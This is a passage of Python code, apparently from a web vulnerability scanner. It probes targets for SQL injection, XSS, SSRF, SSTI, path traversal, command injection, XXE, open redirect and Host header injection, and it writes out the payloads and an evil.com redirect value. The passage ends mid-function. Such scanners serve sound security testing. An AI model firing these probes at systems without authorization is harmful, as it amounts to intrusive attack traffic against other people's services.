            _add_finding(sid, {
                'severity': 'high',
                'title':    'SQL Injection - Form',
                'endpoint': form['action'],
                'detail':   f'DB error ({m.group(0)!r}) triggered via form submission - absent in baseline.',
                'evidence': {
                    'action':           form['action'],
                    'method':           method,
                    'db_error':         m.group(0),
                    'request_url':      form['action'],
                    'response_excerpt': _fexc,
                },
            })
    except Exception:
        pass


async def _check_form_xss(sid, form, http):
    method  = form['method']
    canary  = f'{_XSS_CANARY_PREFIX}{uuid.uuid4().hex[:8]}'
    payload = f'<script>alert("{canary}")</script>'

    # Baseline with original values - confirm canary prefix absent
    baseline_body = ''
    try:
        baseline_data = {inp['name']: inp['value'] or 'test' for inp in form['inputs']}
        if method == 'POST':
            async with http.post(form['action'], data=baseline_data, allow_redirects=False) as resp:
                baseline_body = await resp.text(errors='replace')
        else:
            async with http.get(form['action'], params=baseline_data, allow_redirects=False) as resp:
                baseline_body = await resp.text(errors='replace')
    except Exception:
        pass

    data = {inp['name']: payload for inp in form['inputs']}
    try:
        if method == 'POST':
            async with http.post(form['action'], data=data, allow_redirects=False) as resp:
                body = await resp.text(errors='replace')
        else:
            async with http.get(form['action'], params=data, allow_redirects=False) as resp:
                body = await resp.text(errors='replace')
        if canary in body and payload in body and canary not in baseline_body:
            _xidx = body.find(payload)
            _xexc = body[max(0, _xidx - 80):_xidx + len(payload) + 80].strip()
            _add_finding(sid, {
                'severity': 'high',
                'title':    'Reflected XSS - Form',
                'endpoint': form['action'],
                'detail':   'XSS payload reflected verbatim in form response (absent in baseline).',
                'evidence': {
                    'action':           form['action'],
                    'method':           method,
                    'payload':          payload,
                    'request_url':      form['action'],
                    'response_excerpt': _xexc,
                },
            })
    except Exception:
        pass


# ── Blind SQLi ────────────────────────────────────────────────────────────────

async def _check_sqli_blind_boolean(sid, url, parsed, qs, param, http):
    """Boolean-based blind: compare true vs false response sizes."""
    baselines = []
    for pl in (_BOOL_TRUE + _BOOL_FALSE)[:2]:
        target = _mutate_url(parsed, qs, param, pl)
        try:
            async with http.get(target, allow_redirects=False) as resp:
                body = await resp.text(errors='replace')
                baselines.append((pl, resp.status, len(body)))
        except Exception:
            return
        await asyncio.sleep(0.05)

    if len(baselines) < 2:
        return

    true_pairs  = []
    false_pairs = []
    for i, (tpl, _) in enumerate(
        zip(_BOOL_TRUE[:2], _BOOL_FALSE[:2])
    ):
        try:
            t_url = _mutate_url(parsed, qs, param, tpl)
            f_url = _mutate_url(parsed, qs, param, _BOOL_FALSE[i])
            async with http.get(t_url, allow_redirects=False) as r:
                tb = await r.text(errors='replace')
                true_pairs.append((r.status, len(tb)))
            async with http.get(f_url, allow_redirects=False) as r:
                fb = await r.text(errors='replace')
                false_pairs.append((r.status, len(fb)))
        except Exception:
            return
        await asyncio.sleep(0.05)

    if not true_pairs or not false_pairs:
        return

    for (ts, tl), (fs, fl) in zip(true_pairs, false_pairs):
        size_diff = abs(tl - fl)
        status_diff = ts != fs
        if (status_diff and fs in (404, 500) and ts == 200) or (size_diff > 50 and size_diff / max(tl, fl, 1) > 0.15):
            _add_finding(sid, {
                'severity': 'high',
                'title':    f'SQL Injection (Boolean Blind) - {param}',
                'endpoint': url,
                'detail':   (
                    f'Response differs between true ({ts}, {tl}B) and false ({fs}, {fl}B) conditions. '
                    f'Size delta: {size_diff}B. Likely boolean-injectable parameter.'
                ),
                'evidence': {
                    'param':            param,
                    'true_status':      ts,
                    'true_size':        tl,
                    'false_status':     fs,
                    'false_size':       fl,
                    'request_url':      url,
                    'response_excerpt': f'TRUE: HTTP {ts} / {tl}B  |  FALSE: HTTP {fs} / {fl}B  (delta {size_diff}B)',
                },
            })
            return


async def _check_sqli_blind_time(sid, url, parsed, qs, param, http, oob_client=None):
    """Time-based blind: inject SLEEP payloads, look for 5s+ response delay."""
    if oob_client:
        token = oob_client.generate_token('sqli')
        oob_client.register_pending(token, 'sqli_blind', {
            'url': url, 'param': param, 'type': 'time_blind',
        })
    _tgt_host = parsed.hostname or ''
    _px = scan_proxy.get_proxy_url()
    slow_timeout = aiohttp.ClientTimeout(total=15 if _px else 8)
    for pl, db in _TIME_PAYLOADS:
        target = _mutate_url(parsed, qs, param, pl)
        try:
            conn = scan_proxy.make_connector(limit=10, target_host=_tgt_host)
            async with aiohttp.ClientSession(connector=conn, timeout=slow_timeout) as sess:
                t0 = time.monotonic()
                async with sess.get(target, allow_redirects=False) as resp:
                    await resp.read()
                    elapsed = time.monotonic() - t0
            if elapsed >= 4.5:
                _add_finding(sid, {
                    'severity': 'critical',
                    'title':    f'SQL Injection (Time Blind, {db}) - {param}',
                    'endpoint': url,
                    'detail':   f'Response delayed {elapsed:.1f}s with SLEEP payload - confirmed time-based SQLi ({db}).',
                    'evidence': {
                        'param':            param,
                        'payload':          pl,
                        'delay_sec':        round(elapsed, 2),
                        'db':               db,
                        'request_url':      target,
                        'response_excerpt': f'Response delayed {elapsed:.1f}s with {pl!r} (DB: {db})',
                    },
                })
                return
        except asyncio.TimeoutError:
            _add_finding(sid, {
                'severity': 'critical',
                'title':    f'SQL Injection (Time Blind, {db}) - {param}',
                'endpoint': url,
                'detail':   f'Request timed out (>18s) with SLEEP payload - confirmed time-based SQLi ({db}).',
                'evidence': {
                    'param':            param,
                    'payload':          pl,
                    'db':               db,
                    'request_url':      target,
                    'response_excerpt': f'Request timed out (>18s) with {pl!r} (DB: {db})',
                },
            })
            return
        except Exception:
            pass
        await asyncio.sleep(0.1)


async def _check_form_sqli_blind(sid, form, http):
    """Boolean blind for forms: compare response with true vs false inputs."""
    method = form['method']
    if not form['inputs']:
        return

    def _make_data(payload):
        return {inp['name']: payload for inp in form['inputs']}

    sizes = {}
    for label, pl in [('true', "' AND '1'='1'--"), ('false', "' AND '1'='2'--")]:
        try:
            data = _make_data(pl)
            if method == 'POST':
                async with http.post(form['action'], data=data, allow_redirects=False) as r:
                    body = await r.text(errors='replace')
                    sizes[label] = (r.status, len(body))
            else:
                async with http.get(form['action'], params=data, allow_redirects=False) as r:
                    body = await r.text(errors='replace')
                    sizes[label] = (r.status, len(body))
        except Exception:
            return
        await asyncio.sleep(0.05)

    if 'true' not in sizes or 'false' not in sizes:
        return
    ts, tl = sizes['true']
    fs, fl = sizes['false']
    size_diff = abs(tl - fl)
    if (ts != fs and fs in (404, 500)) or (size_diff > 50 and size_diff / max(tl, fl, 1) > 0.15):
        _add_finding(sid, {
            'severity': 'high',
            'title':    'SQL Injection (Boolean Blind) - Form',
            'endpoint': form['action'],
            'detail':   f'True/false responses differ: true={ts}/{tl}B false={fs}/{fl}B.',
            'evidence': {
                'action':           form['action'],
                'method':           method,
                'true_status':      ts,
                'false_status':     fs,
                'request_url':      form['action'],
                'response_excerpt': f'TRUE: HTTP {ts} / {tl}B  |  FALSE: HTTP {fs} / {fl}B  (delta {size_diff}B)',
            },
        })


# ── Contextual XSS ────────────────────────────────────────────────────────────

def _detect_xss_context(before: str, after: str) -> str:
    """Determine HTML context from surrounding text."""
    # Inside <script> block
    script_open  = before.rfind('<script')
    script_close = before.rfind('</script')
    if script_open > script_close:
        if '"' in before[script_open:]:
            return 'js_dq'
        if "'" in before[script_open:]:
            return 'js_sq'
        if '`' in before[script_open:]:
            return 'js_tpl'
        return 'js_dq'

    # Inside HTML comment
    comment_open  = before.rfind('<!--')
    comment_close = before.rfind('-->')
    if comment_open > comment_close:
        return 'comment'

    # Inside HTML tag attribute
    last_lt = before.rfind('<')
    last_gt = before.rfind('>')
    if last_lt > last_gt:
        # We're inside an open tag - check quote type
        tag_frag = before[last_lt:]
        eq_pos   = tag_frag.rfind('=')
        if eq_pos >= 0:
            after_eq = tag_frag[eq_pos+1:].lstrip()
            if after_eq.startswith('"'):
                return 'attr_dq'
            if after_eq.startswith("'"):
                return 'attr_sq'
            return 'attr_unq'
        return 'attr_dq'

    return 'html'


async def _check_xss_contextual(sid, url, parsed, qs, param, http):
    """Context-aware XSS: detect where value is reflected, choose breaking payload."""
    marker = f'ds1ctx{uuid.uuid4().hex[:8]}'
    target = _mutate_url(parsed, qs, param, marker)
    try:
        async with http.get(target, allow_redirects=False) as resp:
            body = await resp.text(errors='replace')
    except Exception:
        return

    if marker not in body:
        return

    idx    = body.find(marker)
    before = body[max(0, idx - 200): idx]
    after  = body[idx + len(marker): idx + len(marker) + 100]
    ctx    = _detect_xss_context(before, after)

    pls = _XSS_CTX_PAYLOADS.get(ctx, _XSS_CTX_PAYLOADS['html'])
    for pl_tpl in pls:
        canary = f'{_XSS_CANARY_PREFIX}{uuid.uuid4().hex[:8]}'
        pl     = pl_tpl.replace('{canary}', canary)
        test   = _mutate_url(parsed, qs, param, pl)
        try:
            async with http.get(test, allow_redirects=False) as resp:
                body2 = await resp.text(errors='replace')
                if canary in body2:
                    _cidx = body2.find(canary)
                    _cexc = body2[max(0, _cidx - 80):_cidx + len(canary) + 80].strip()
                    _add_finding(sid, {
                        'severity': 'high',
                        'title':    f'XSS ({ctx} context) - {param}',
                        'endpoint': url,
                        'detail':   f'Canary reflected in {ctx} context with context-breaking payload.',
                        'evidence': {
                            'param':            param,
                            'context':          ctx,
                            'payload':          pl,
                            'request_url':      test,
                            'response_excerpt': _cexc,
                        },
                    })
                    return
        except Exception:
            pass
        await asyncio.sleep(0.05)


async def _check_form_xss_contextual(sid, form, http):
    """Context-aware XSS via form submission."""
    if not form['inputs']:
        return
    method = form['method']
    marker = f'ds1ctx{uuid.uuid4().hex[:8]}'
    data   = {inp['name']: marker for inp in form['inputs']}

    try:
        if method == 'POST':
            async with http.post(form['action'], data=data, allow_redirects=False) as resp:
                body = await resp.text(errors='replace')
        else:
            async with http.get(form['action'], params=data, allow_redirects=False) as resp:
                body = await resp.text(errors='replace')
    except Exception:
        return

    if marker not in body:
        return

    idx  = body.find(marker)
    ctx  = _detect_xss_context(body[max(0, idx-200):idx], body[idx+len(marker):idx+len(marker)+100])
    pls  = _XSS_CTX_PAYLOADS.get(ctx, _XSS_CTX_PAYLOADS['html'])

    for pl_tpl in pls[:2]:
        canary = f'{_XSS_CANARY_PREFIX}{uuid.uuid4().hex[:8]}'
        pl     = pl_tpl.replace('{canary}', canary)
        data2  = {inp['name']: pl for inp in form['inputs']}
        try:
            if method == 'POST':
                async with http.post(form['action'], data=data2, allow_redirects=False) as resp:
                    body2 = await resp.text(errors='replace')
            else:
                async with http.get(form['action'], params=data2, allow_redirects=False) as resp:
                    body2 = await resp.text(errors='replace')
            if canary in body2:
                _c2idx = body2.find(canary)
                _c2exc = body2[max(0, _c2idx - 80):_c2idx + len(canary) + 80].strip()
                _add_finding(sid, {
                    'severity': 'high',
                    'title':    f'XSS ({ctx} context) - Form',
                    'endpoint': form['action'],
                    'detail':   f'Context-breaking XSS payload reflected in {ctx} context.',
                    'evidence': {
                        'action':           form['action'],
                        'context':          ctx,
                        'payload':          pl,
                        'request_url':      form['action'],
                        'response_excerpt': _c2exc,
                    },
                })
                return
        except Exception:
            pass
        await asyncio.sleep(0.05)


# ── SSRF ──────────────────────────────────────────────────────────────────────

async def _check_ssrf(sid, url, parsed, qs, param, http, oob_client=None):
    """Probe URL-like parameters for SSRF via cloud metadata endpoint content leakage."""
    if oob_client:
        token = oob_client.generate_token('ssrf')
        for oob_url in oob_client.blind_ssrf_urls(token)[:3]:
            target = _mutate_url(parsed, qs, param, oob_url)
            try:
                async with http.get(target, allow_redirects=True) as resp:
                    await resp.read()
            except Exception:
                pass
        oob_client.register_pending(token, 'ssrf', {
            'url': url, 'param': param, 'payload': f'http://{oob_client.server_host}/',
        })
        await asyncio.sleep(0.1)

    # Baseline: check which SSRF signatures already appear in the normal response
    baseline_body = ''
    try:
        async with http.get(url, allow_redirects=False) as resp:
            baseline_body = await resp.text(errors='replace')
    except Exception:
        pass

    for probe_url, sigs in _SSRF_PROBES:
        target = _mutate_url(parsed, qs, param, probe_url)
        try:
            async with http.get(target, allow_redirects=True) as resp:
                body = await resp.text(errors='replace')
                # Only count signatures absent in baseline - prevents FP from apps that
                # display internal hostnames or AWS-like strings naturally
                matched = [
                    s for s in sigs
                    if s.lower() in body.lower() and s.lower() not in baseline_body.lower()
                ]
                if matched:
                    _sig0 = matched[0]
                    _sidx = body.lower().find(_sig0.lower())
                    _sexc = body[max(0, _sidx - 100):_sidx + len(_sig0) + 100].strip() if _sidx >= 0 else ''
                    _add_finding(sid, {
                        'severity': 'critical',
                        'title':    f'SSRF - {param}',
                        'endpoint': url,
                        'detail':   (
                            f'Server fetched {probe_url} and response contains '
                            f'metadata signatures absent in baseline: {matched}.'
                        ),
                        'evidence': {
                            'param':            param,
                            'probe':            probe_url,
                            'signatures_found': matched,
                            'request_url':      target,
                            'response_excerpt': _sexc,
                        },
                    })
                    return
        except Exception:
            pass
        await asyncio.sleep(0.08)


async def _check_form_ssrf(sid, form, http):
    """SSRF via form - only for URL/src/dest inputs."""
    url_inputs = [
        inp for inp in form['inputs']
        if _SSRF_PARAM_RE.search(inp['name'])
    ]
    if not url_inputs:
        return

    method = form['method']
    # Baseline: submit form with original values to capture pre-existing signatures
    baseline_body = ''
    try:
        baseline_data = {inp['name']: inp['value'] for inp in form['inputs']}
        if method == 'POST':
            async with http.post(form['action'], data=baseline_data, allow_redirects=False) as resp:
                baseline_body = await resp.text(errors='replace')
        else:
            async with http.get(form['action'], params=baseline_data, allow_redirects=False) as resp:
                baseline_body = await resp.text(errors='replace')
    except Exception:
        pass

    for probe_url, sigs in _SSRF_PROBES[:2]:
        data = {inp['name']: inp['value'] for inp in form['inputs']}
        for ui in url_inputs:
            data[ui['name']] = probe_url
        try:
            if method == 'POST':
                async with http.post(form['action'], data=data, allow_redirects=True) as resp:
                    body = await resp.text(errors='replace')
            else:
                async with http.get(form['action'], params=data, allow_redirects=True) as resp:
                    body = await resp.text(errors='replace')
            matched = [
                s for s in sigs
                if s.lower() in body.lower() and s.lower() not in baseline_body.lower()
            ]
            if matched:
                _fs0 = matched[0]
                _fsidx = body.lower().find(_fs0.lower())
                _fsexc = body[max(0, _fsidx - 100):_fsidx + len(_fs0) + 100].strip() if _fsidx >= 0 else ''
                _add_finding(sid, {
                    'severity': 'critical',
                    'title':    'SSRF - Form',
                    'endpoint': form['action'],
                    'detail':   (
                        f'Form submission with probe URL {probe_url} returned metadata '
                        f'signatures absent in baseline: {matched}.'
                    ),
                    'evidence': {
                        'action':           form['action'],
                        'probe':            probe_url,
                        'signatures_found': matched,
                        'request_url':      form['action'],
                        'response_excerpt': _fsexc,
                    },
                })
                return
        except Exception:
            pass
        await asyncio.sleep(0.08)


async def _check_form_ssti(sid, form, http):
    """SSTI detection via form submission."""
    if not form['inputs']:
        return
    method = form['method']

    # Baseline: submit with safe values, record which expected strings already appear
    baseline_body = ''
    try:
        baseline_data = {inp['name']: inp['value'] or 'test' for inp in form['inputs']}
        if method == 'POST':
            async with http.post(form['action'], data=baseline_data, allow_redirects=False) as resp:
                baseline_body = await resp.text(errors='replace')
        else:
            async with http.get(form['action'], params=baseline_data, allow_redirects=False) as resp:
                baseline_body = await resp.text(errors='replace')
    except Exception:
        pass

    for pl, expected in _SSTI_PAYLOADS.items():
        if expected in baseline_body:
            continue  # expected value already present - not a real injection
        data = {inp['name']: pl for inp in form['inputs']}
        try:
            if method == 'POST':
                async with http.post(form['action'], data=data, allow_redirects=False) as resp:
                    body = await resp.text(errors='replace')
            else:
                async with http.get(form['action'], params=data, allow_redirects=False) as resp:
                    body = await resp.text(errors='replace')
            if expected in body:
                _stidx = body.find(expected)
                _stexc = body[max(0, _stidx - 150):_stidx + len(expected) + 150].strip()
                _add_finding(sid, {
                    'severity': 'critical',
                    'title':    'Server-Side Template Injection - Form',
                    'endpoint': form['action'],
                    'detail':   f'Math expression {pl!r} evaluated to {expected} via form (absent in baseline).',
                    'evidence': {
                        'action':           form['action'],
                        'method':           method,
                        'payload':          pl,
                        'evaluated':        expected,
                        'request_url':      form['action'],
                        'response_excerpt': _stexc,
                    },
                })
                return
        except Exception:
            pass
        await asyncio.sleep(0.05)


async def _check_form_traversal(sid, form, http):
    """Path traversal detection via form submission."""
    if not form['inputs']:
        return
    method = form['method']

    # Baseline: submit safe values, abort if traversal signature already present
    baseline_body = ''
    try:
        baseline_data = {inp['name']: inp['value'] or 'test' for inp in form['inputs']}
        if method == 'POST':
            async with http.post(form['action'], data=baseline_data, allow_redirects=False) as resp:
                baseline_body = await resp.text(errors='replace')
        else:
            async with http.get(form['action'], params=baseline_data, allow_redirects=False) as resp:
                baseline_body = await resp.text(errors='replace')
    except Exception:
        pass
    if _TRAVERSAL_SIG.search(baseline_body):
        return  # signature pre-exists in baseline

    for pl in _TRAVERSAL_PAYLOADS[:8]:
        data = {inp['name']: pl for inp in form['inputs']}
        try:
            if method == 'POST':
                async with http.post(form['action'], data=data, allow_redirects=False) as resp:
                    body = await resp.text(errors='replace')
            else:
                async with http.get(form['action'], params=data, allow_redirects=False) as resp:
                    body = await resp.text(errors='replace')
            _trav_m = _TRAVERSAL_SIG.search(body)
            if _trav_m:
                _tidx = body.find(_trav_m.group(0))
                _texc = body[max(0, _tidx - 80):_tidx + 300].strip()
                _add_finding(sid, {
                    'severity': 'critical',
                    'title':    'Path Traversal - Form',
                    'endpoint': form['action'],
                    'detail':   '/etc/passwd content confirmed in form response (absent in baseline).',
                    'evidence': {
                        'action':           form['action'],
                        'method':           method,
                        'payload':          pl,
                        'request_url':      form['action'],
                        'response_excerpt': _texc,
                    },
                })
                return
        except Exception:
            pass
        await asyncio.sleep(0.05)


async def _check_form_cmd_inject(sid, form, http):
    """Command injection detection via form submission (timing + error)."""
    if not form['inputs']:
        return
    method = form['method']

    # Baseline timing + error state
    baseline_time = 1.0
    baseline_body = ''
    try:
        baseline_data = {inp['name']: inp['value'] or 'test' for inp in form['inputs']}
        _tb = time.monotonic()
        if method == 'POST':
            async with http.post(form['action'], data=baseline_data, allow_redirects=False) as resp:
                baseline_time = max(0.1, time.monotonic() - _tb)
                baseline_body = await resp.text(errors='replace')
        else:
            async with http.get(form['action'], params=baseline_data, allow_redirects=False) as resp:
                baseline_time = max(0.1, time.monotonic() - _tb)
                baseline_body = await resp.text(errors='replace')
    except Exception:
        pass
    _timing_threshold = max(4.5, baseline_time * 3)

    for pl in _CMD_PAYLOADS[:3]:
        data = {inp['name']: pl for inp in form['inputs']}
        try:
            t0 = time.monotonic()
            if method == 'POST':
                async with http.post(form['action'], data=data, allow_redirects=False) as resp:
                    elapsed = time.monotonic() - t0
                    body = await resp.text(errors='replace')
            else:
                async with http.get(form['action'], params=data, allow_redirects=False) as resp:
                    elapsed = time.monotonic() - t0
                    body = await resp.text(errors='replace')
            if elapsed >= _timing_threshold:
                _add_finding(sid, {
                    'severity': 'critical',
                    'title':    'Command Injection (timing) - Form',
                    'endpoint': form['action'],
                    'detail':   (
                        f'Response delayed {elapsed:.1f}s (baseline {baseline_time:.1f}s) '
                        f'with payload {pl!r} via form.'
                    ),
                    'evidence': {
                        'action':       form['action'],
                        'payload':      pl,
                        'delay_sec':    round(elapsed, 2),
                        'baseline_sec': round(baseline_time, 2),
                        'request_url':  form['action'],
                    },
                })
                return
            m = _CMD_ERROR_SIG.search(body)
            if m and not _CMD_ERROR_SIG.search(baseline_body):
                _fcidx = body.find(m.group(0))
                _fcexc = body[max(0, _fcidx - 80):_fcidx + len(m.group(0)) + 80].strip()
                _add_finding(sid, {
                    'severity': 'critical',
                    'title':    'Command Injection (error) - Form',
                    'endpoint': form['action'],
                    'detail':   f'Shell error ({m.group(0)!r}) in form response with {pl!r} - absent in baseline.',
                    'evidence': {
                        'action':           form['action'],
                        'method':           method,
                        'payload':          pl,
                        'request_url':      form['action'],
                        'response_excerpt': _fcexc,
                    },
                })
                return
        except asyncio.TimeoutError:
            _add_finding(sid, {
                'severity': 'critical',
                'title':    'Command Injection (timeout) - Form',
                'endpoint': form['action'],
                'detail':   f'Request timed out with sleep payload {pl!r} via form.',
                'evidence': {
                    'action':      form['action'],
                    'payload':     pl,
                    'request_url': form['action'],
                },
            })
            return
        except Exception:
            pass
        await asyncio.sleep(0.1)


# ── XXE ───────────────────────────────────────────────────────────────────────

async def _check_xxe(sid, url, http, oob_client=None):
    """Try XXE by POSTing XML payloads with multiple content types."""
    if oob_client:
        token = oob_client.generate_token('xxe')
        oob_payload = oob_client.blind_xxe_payload(token)
        for ct in _XML_CONTENT_TYPES[:2]:
            try:
                async with http.post(
                    url, data=oob_payload.encode(),
                    headers={'Content-Type': ct}, allow_redirects=False,
                ) as resp:
                    await resp.read()
            except Exception:
                pass
        oob_client.register_pending(token, 'xxe', {'url': url})
        await asyncio.sleep(0.1)

    # Baseline GET: capture any pre-existing XXE signatures in the normal response
    baseline_body = ''
    try:
        async with http.get(url, allow_redirects=False) as resp:
            baseline_body = await resp.text(errors='replace')
    except Exception:
        pass

    for ct in _XML_CONTENT_TYPES[:3]:
        for xml_pl, sigs, desc in _XXE_PAYLOADS_EXT:
            try:
                hdrs = {'Content-Type': ct}
                async with http.post(
                    url, data=xml_pl.encode(), headers=hdrs, allow_redirects=False
                ) as resp:
                    if resp.status in (200, 400, 500):
                        body = await resp.text(errors='replace')
                        # Only count signatures absent in baseline
                        sig_hit = (
                            (_XXE_SIG.search(body) and not _XXE_SIG.search(baseline_body))
                            or any(
                                s.lower() in body.lower() and s.lower() not in baseline_body.lower()
                                for s in sigs
                            )
                        )
                        if sig_hit:
                            _add_finding(sid, {
                                'severity': 'critical',
                                'title':    'XXE Injection',
                                'endpoint': url,
                                'detail':   (
                                    f'XML External Entity processed ({desc}) - signature absent in baseline. '
                                    f'Content-Type: {ct}. Server returned sensitive data.'
                                ),
                                'evidence': {
                                    'content_type':     ct,
                                    'variant':          desc,
                                    'request_url':      url,
                                    'response_excerpt': body[:300],
                                },
                            })
                            return
            except Exception:
                pass
            await asyncio.sleep(0.05)


async def _check_form_redirect(sid, form, http):
    """Detect open redirect via form hidden inputs with redirect-like names."""
    redirect_inputs = [
        inp for inp in form.get('inputs', [])
        if inp['name'].lower() in {n.lower() for n in _REDIRECT_PARAM_NAMES}
    ]
    if not redirect_inputs:
        return
    method = form.get('method', 'GET')
    for evil in ('https://evil.com', '//evil.com'):
        data = {inp['name']: inp['value'] for inp in form['inputs']}
        for ri in redirect_inputs:
            data[ri['name']] = evil
        try:
            if method == 'POST':
                async with http.post(form['action'], data=data, allow_redirects=False) as resp:
                    loc = resp.headers.get('Location', '')
            else:
                async with http.get(form['action'], params=data, allow_redirects=False) as resp:
                    loc = resp.headers.get('Location', '')
            if resp.status in (301, 302, 303, 307, 308) and 'evil.com' in loc:
                _add_finding(sid, {
                    'severity': 'medium',
                    'title':    'Open Redirect (form hidden field)',
                    'endpoint': form['action'],
                    'detail': (
                        f'Form contains redirect field(s) '
                        f'({", ".join(ri["name"] for ri in redirect_inputs)}) '
                        f'that caused redirect to: {loc}'
                    ),
                    'evidence': {
                        'action':           form['action'],
                        'method':           method,
                        'fields':           [ri['name'] for ri in redirect_inputs],
                        'payload':          evil,
                        'location':         loc,
                        'request_url':      form['action'],
                        'response_excerpt': f'HTTP {resp.status}\nLocation: {loc}',
                    },
                })
                return
        except Exception:
            pass
        await asyncio.sleep(0.05)


# ── New competitive checks ────────────────────────────────────────────────────

def _check_csrf(sid, form):
    """Synchronous check: POST form missing any known CSRF token field."""
    if form.get('method', 'GET') != 'POST':
        return
    input_names_lower = {inp['name'].lower() for inp in form.get('inputs', [])}
    if not input_names_lower.intersection(_CSRF_FIELD_NAMES):
        _add_finding(sid, {
            'severity': 'medium',
            'title':    'Missing CSRF Protection - Form',
            'endpoint': form['action'],
            'detail': (
                'POST form contains no CSRF token field. '
                'An attacker may forge cross-site requests.'
            ),
            'evidence': {
                'action': form['action'],
                'fields': sorted(input_names_lower),
            },
        })


async def _check_verb_tampering(sid, url, http, baseline_status: int):
    """Try non-GET HTTP verbs; flag 403→200 bypass or dangerous enabled methods."""
    for verb in _HTTP_VERBS:
        if _stopped(sid):
            return
        try:
            async with http.request(verb, url, allow_redirects=False) as resp:
                if baseline_status in (401, 403) and resp.status not in (401, 403, 404, 405):
                    _add_finding(sid, {
                        'severity': 'high',
                        'title':    f'HTTP Verb Tampering - {verb} bypasses access control',
                        'endpoint': url,
                        'detail': (
                            f'GET returned {baseline_status} but {verb} returned {resp.status}. '
                            'Access control may not apply uniformly across HTTP methods.'
                        ),
                        'evidence': {'verb': verb, 'baseline': baseline_status, 'result': resp.status},
                    })
                    return
                if resp.status == 200 and verb in ('TRACE', 'TRACK'):
                    body = await resp.text(errors='replace')
                    if 'Authorization' in body or 'Cookie' in body:
                        _add_finding(sid, {
                            'severity': 'medium',
                            'title':    f'HTTP {verb} Enabled - Header Reflection',
                            'endpoint': url,
                            'detail': (
                                f'{verb} is enabled and reflects request headers. '
                                'May expose Authorization or Cookie headers to XST attacks.'
                            ),
                            'evidence': {'verb': verb, 'status': resp.status},
                        })
                        return
        except Exception:
            pass
        await asyncio.sleep(0.05)


async def _check_host_header(sid, url, http):
    """Inject attacker-controlled Host / X-Forwarded-Host and look for reflection."""
    # Baseline: capture which values are already in the normal response.
    # 127.0.0.1 and localhost appear naturally on many pages.
    baseline_body = ''
    baseline_loc  = ''
    try:
        async with http.get(url, allow_redirects=False) as resp:
            baseline_body = await resp.text(errors='replace')
            baseline_loc  = resp.headers.get('Location', '')
    except Exception:
        pass

    for evil_host in _HOST_INJECTION_VALUES:
        if _stopped(sid):
            return
        # Skip if this value already appears in the clean baseline
        if evil_host in baseline_body or ('evil.com' in evil_host and 'evil.com' in baseline_loc):
            continue
        for header_name in ('Host', 'X-Forwarded-Host', 'X-Host', 'X-Forwarded-Server'):
            try:
                async with http.get(
                    url, allow_redirects=False,
                    headers={header_name: evil_host},
                ) as resp:
                    body = await resp.text(errors='replace')
                    loc  = resp.headers.get('Location', '')
                    # Only flag if injected value appears AND was absent in baseline
                    in_body = evil_host in body and evil_host not in baseline_body
                    in_loc  = ('evil.com' in evil_host and 'evil.com' in loc
                               and 'evil.com' not in baseline_loc)
                    if in_body or in_loc:
                        if in_body:
                            _hhidx = body.find(evil_host)
                            _hhexc = body[max(0, _hhidx - 100):_hhidx + len(evil_host) + 100].strip()
                        else:
                            _hhexc = f'Location: {loc}'
                        _add_finding(sid, {
                            'severity': 'high',
                            'title':    f'Host Header Injection - {header_name}',
                            'endpoint': url,
                            'detail': (
                                f'Injected {header_name}: {evil_host} - value reflected in response '
                                '(absent in baseline). May enable password-reset poisoning or cache poisoning.'
                            ),
                            'evidence': {
                                'header':           header_name,
                                'injected':         evil_host,
                                'reflected_in':     'body' if in_body else 'location',
                                'request_url':      url,
                                'response_excerpt': _hhexc,
                            },
                        })
                        return
            except Exception:
                pass
            await asyncio.sleep(0.04)


async def _check_json_injection(sid, url, http, ep):
    """Detect JSON REST APIs and probe body parameters with SQLi / XSS / SSTI."""
    ct = ep.get('ct', '')
    is_json = (
        'json' in ct
        or '/api/' in url or '/v1/' in url or '/v2/' in url or '/v3/' in url
        or '/rest/' in url or '/graphql' in url
    )
    if not is_json:
        try:
            async with http.get(url, allow_redirects=False) as resp:
                resp_ct = resp.headers.get('Content-Type', '')
                if 'json' not in resp_ct:
                    return
        except Exception:
            return

    # Baseline: capture pre-existing SQLi error strings and '49' occurrences
    baseline_body = ''
    try:
        async with http.get(url, allow_redirects=False) as resp:
            baseline_body = await resp.text(errors='replace')
    except Exception:
        pass

    xss_canary  = f'{_XSS_CANARY_PREFIX}{uuid.uuid4().hex[:6]}'
    xss_payload = f'<script>alert("{xss_canary}")</script>'

    probes = [
        ('sqli', "'"),
        ('sqli', '" OR "1"="1'),
        ('xss',  xss_payload),
        ('ssti', '{{7*7}}'),
    ]

    for pname in _JSON_PROBE_PARAMS[:12]:
        for probe_type, probe_val in probes:
            if _stopped(sid):
                return
            try:
                async with http.post(
                    url, json={pname: probe_val},
                    headers={'Content-Type': 'application/json'},
                    allow_redirects=False,
                ) as resp:
                    if resp.status not in (200, 201, 400, 422, 500):
                        continue
                    text = await resp.text(errors='replace')
                    m_sqli = probe_type == 'sqli' and _SQLI_ERRORS.search(text)
                    if m_sqli and not _SQLI_ERRORS.search(baseline_body):
                        _jidx = text.find(m_sqli.group(0))
                        _jexc = text[max(0, _jidx - 120):_jidx + len(m_sqli.group(0)) + 120].strip()
                        _add_finding(sid, {
                            'severity': 'high',
                            'title':    f'SQL Injection (JSON body) - {pname}',
                            'endpoint': url,
                            'detail':   f'DB error ({m_sqli.group(0)!r}) triggered via JSON body param {pname!r} - absent in baseline.',
                            'evidence': {
                                'param':            pname,
                                'payload':          probe_val,
                                'method':           'POST/JSON',
                                'request_url':      url,
                                'response_excerpt': _jexc,
                            },
                        })
                        return
                    elif probe_type == 'xss' and xss_canary in text and xss_canary not in baseline_body:
                        _xjidx = text.find(xss_canary)
                        _xjexc = text[max(0, _xjidx - 80):_xjidx + len(xss_canary) + 80].strip()
                        _add_finding(sid, {
                            'severity': 'high',
                            'title':    f'XSS (JSON body) - {pname}',
                            'endpoint': url,
                            'detail':   f'XSS canary reflected from JSON body param {pname!r} (absent in baseline).',
                            'evidence': {
                                'param':            pname,
                                'payload':          probe_val,
                                'method':           'POST/JSON',
                                'request_url':      url,
                                'response_excerpt': _xjexc,
                            },
                        })
                        return
                    elif probe_type == 'ssti':
                        # Require the string "49" to appear in a JSON-value context, not baseline
                        ssti_hit = (
                            ('"49"' in text or ': 49' in text or ':49' in text)
                            and '"49"' not in baseline_body
                            and ': 49' not in baseline_body
                        )
                        if ssti_hit:
                            _s49 = '"49"' if '"49"' in text else (': 49' if ': 49' in text else ':49')
                            _sjidx = text.find(_s49)
                            _sjexc = text[max(0, _sjidx - 80):_sjidx + len(_s49) + 80].strip()
                            _add_finding(sid, {
                                'severity': 'critical',
